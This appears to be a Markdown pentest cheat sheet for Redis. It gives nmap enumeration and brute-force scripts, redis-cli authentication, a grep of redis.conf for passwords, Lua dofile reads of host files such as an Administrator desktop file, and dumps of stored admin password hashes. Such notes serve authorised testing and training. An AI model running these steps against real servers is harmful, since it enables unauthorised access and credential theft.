# <span style="color:#FF5555">Commands</span>
### <span style="color:#50FA7B">Enumeration</span>
```bash
nmap --script redis-info -p 6379 $VICTIM_IP
nmap --script redis-brute -p 6379 $VICTIM_IP

msf> use auxiliary/scanner/redis/redis_server
```

### <span style="color:#50FA7B">Connect</span>

```bash
redis-cli -h $VICTIM_IP -p 6379               # no auth (anonymous)
# with password
redis-cli -h $VICTIM_IP -p 6379 -a password
redis-cli -h $VICTIM_IP -p 6379 -a $PASS                 # password from the vault
redis-cli -h $VICTIM_IP -p 6379 --user $USER -a $PASS    # ACL user from the vault

# using socket
redis-cli -s /path/to/redis.sock
```
After connecting and execute the first arbitrary command, we may got the following output.
```
NOAUTH Authentication required.
```
If so, we need to authenticate to communicate with the redis server.
```bash
> auth $PASS
# or
> auth default $PASS
# or
> auth $USER $PASS
```

### <span style="color:#50FA7B">Check Config File</span>
If we have access to target system, find the configuration file then we may be able to get passwords.
```bash
find / -name "redis.conf" 2>/dev/null
grep -i pass /path/to/redis.conf
```
If we get the line with password written as below,
```bash
requirepass "password"
```
We can set the password in a redis client.
```bash
> auth "password"
```


### <span style="color:#50FA7B">Basic Commands</span>

```bash
# Check credentials
> auth $USER $PASS
> auth default $PASS

# Set a password temporary until the service restarts.
> config set requirepass $PASS

# Information on the Redis server
> info
> info keyspace

# List all
> config get *

# List all databases
> config get databases

# Select the database ('select <index>')
> select 0
> select 1
> select 12

# Read files and directories using Lua scripts
> eval "dofile('C:\\\\Users\\\\Administrator\\\\Desktop\\\\user.txt')" 0
> eval "dofile('C:\\\\Users\\\\$USER\\\\Desktop\\\\user.txt')" 0

# Find all keys
> keys *

# Get the type of value
> type <key_name>

# Get all fields and values of the hash stored at key.
> hgetall <key>
# e.g.
> hgetall admin

# Get a string value
> get <key> <field>
# e.g.
> get admin email

# Get a hashed value
> hget <key> <field>
# e.g.
> hget admin password

# Get multiple hashed values associated with specified fields
> hmget <key> <field1> <field2>
# e.g.
> hmget admin email password


# type: lists
> lrange <key_name> <start> <stop>
# e.g.
> lrange "userlist" 0 0
> lrange "userlist" 0 5

# type: sets
> smembers <key_name>

# type: sorted sets
> zrangebyscore <key_name> <min> <max>

# type: stream
> xread count <count> streams <key_name> <id>
```
